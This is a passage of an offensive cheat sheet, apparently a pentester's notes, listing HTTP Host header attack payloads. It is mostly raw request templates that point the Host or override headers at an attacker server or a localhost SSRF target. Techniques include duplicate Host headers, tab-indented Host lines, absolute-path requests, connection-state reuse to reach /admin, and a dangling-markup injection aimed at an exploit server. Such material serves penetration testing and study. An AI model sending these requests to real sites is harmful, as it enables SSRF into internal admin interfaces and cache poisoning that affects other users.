 - `X-Host`
- `X-Forwarded-Server`
- `X-HTTP-Host-Override`
- `Forwarded`

### ARBITRARY HOST / TRY FIRST INSERT COLLABORATOR PAYLOAD 

```
GET /admin
Host: <VULNERABLE-WEB>:<OUR-SV>||<LOCALHOST-SSRF>
```

### DUPLICATE HOST / SWITCH ORDER
```
GET /example HTTP/1.1
Host: <VULNERABLE-WEB>
Host: <OUR-SV>||<LOCALHOST-SSRF>
```

### MALICIOUS INDENTED \<TAB> (TRY MORE TABS) HOST + LEGIT HOST
```
GET /example HTTP/1.1
	Host: <OUR-SV>||<LOCALHOST-SSRF>         
Host: <VULNERABLE-WEB>
```

### TRY OTHER HEADERS -> X-Host, X-Forwarded-Server, X-HTTP-Host-Override ... etc
```
GET /example HTTP/1.1
Host: <VULNERABLE-WEB>
X-Forwarded-Host: <OUR-SV>||<LOCALHOST-SSRF>
```
### ABSOLUTE PATH = IGNORE HOST 
```
GET <ABSOLUTE_PATH>            
Host: <OUR-SV>||<LOCALHOST-SSRF>
```

### MULTIPLE REQUEST IN A SINGLE CONNECTION
```
## REQUEST 1
GET /
Host: <VALID-HOST>
Connection: keep-alive
## REQUEST 2
GET /admin
Host: <VULNERABLE-WEB>:<OUR-SV>|
Connection: keep-alive

# AFTER PORT : DELIMETER - DANGLING MARKUP
GET /
Host: <YOUR-LAB>:'<a href="//<EXPLOIT-SV>/?
```

